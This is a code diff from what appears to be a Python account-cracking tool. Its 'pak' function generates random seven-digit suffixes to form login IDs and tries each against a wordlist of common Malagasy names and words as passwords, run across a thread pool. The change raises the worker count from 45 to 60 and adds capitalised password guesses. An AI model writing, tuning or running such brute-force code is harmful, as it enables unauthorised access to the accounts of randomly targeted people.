@@ -433,7 +433,7 @@ def pak():
                 for nmbr in range(limit):
                         nmp = ''.join(random.choice(string.digits) for _ in range(7))
                         user.append(nmp)
-                with tred(max_workers=45) as ennic:     
+                with tred(max_workers=60) as ennic:     
                         clear()
                         
                         tl = str(len(user))
@@ -443,7 +443,7 @@ def pak():
                         linex()
                         for psx in user:
                                 ids = code+psx
-                                passlist = [psx,ids,'fitiavana','tanjona','malala','mamako','vadiko','randria','rakoto','sitraka','malalako','mamiko','faniry','lahatra','nirina','nomena','tolotra','safidy','tantely','sarika','malalako','harena','tahiry','valisoa','mamiko','niaina','faniry','nilaina','mihary','mahery','Mahery','fanomezana','sitraka','avotra','nantenaina','tahina','fitahina','fifaliana','fitahiana','anjara','volana','nomenjanahary','nomena','sarika','sariaka','finona','finoana','sarobidy','tiavina','tsilavina','lataka','solofo','tanjona','nekena','narindra','safidy','henintsoa','ravaka','valisoa','tantely','natolotra','niaina','Niaina','hasina','Hasina','tahiry','Tahiry','randria','Randria','mihary','Mihary','vadiko','Vadiko','malagasy','Malagasy','tantely','Tantely','felana','Felana','nekena','Nekena','mamako','Mamako','fanantenana','Fanantenana','mahefa','safidy','narovana','nilaina','papako','mihary','ravaka','Ravaka','valisoa','Valisoa','nilaina','tantely','tolotra','volana','sahaza','fanilo','avotra','sarika','nirina','nantenaina','mihary','fanomezana','tafita']
+                                passlist = [psx,ids,'fitiavana','Fitiavana','malala','Malala','mamako','Mamako','vadiko','Vadiko','tanjona','randria','rakoto','sitraka','malalako','mamiko','faniry','lahatra','nirina','nomena','tolotra','safidy','tantely','sarika','malalako','harena','tahiry','valisoa','mamiko','niaina','faniry','nilaina','mihary','mahery','Mahery','fanomezana','sitraka','avotra','nantenaina','tahina','fitahina','fifaliana','fitahiana','anjara','volana','nomenjanahary','nomena','sarika','sariaka','finona','finoana','sarobidy','tiavina','tsilavina','lataka','solofo','tanjona','nekena','narindra','safidy','henintsoa','ravaka','valisoa','tantely','natolotra','niaina','Niaina','hasina','Hasina','tahiry','Tahiry','randria','Randria','mihary','Mihary','vadiko','Vadiko','malagasy','Malagasy','tantely','Tantely','felana','Felana','nekena','Nekena','mamako','Mamako','fanantenana','Fanantenana','mahefa','safidy','narovana','nilaina','papako','mihary','ravaka','Ravaka','valisoa','Valisoa','nilaina','tantely','tolotra','volana','sahaza','fanilo','avotra','sarika','nirina','nantenaina','mihary','fanomezana','tafita']
                                 ennic.submit(rndm,ids,passlist)
                 print('\033[1;37m')
                 linex()
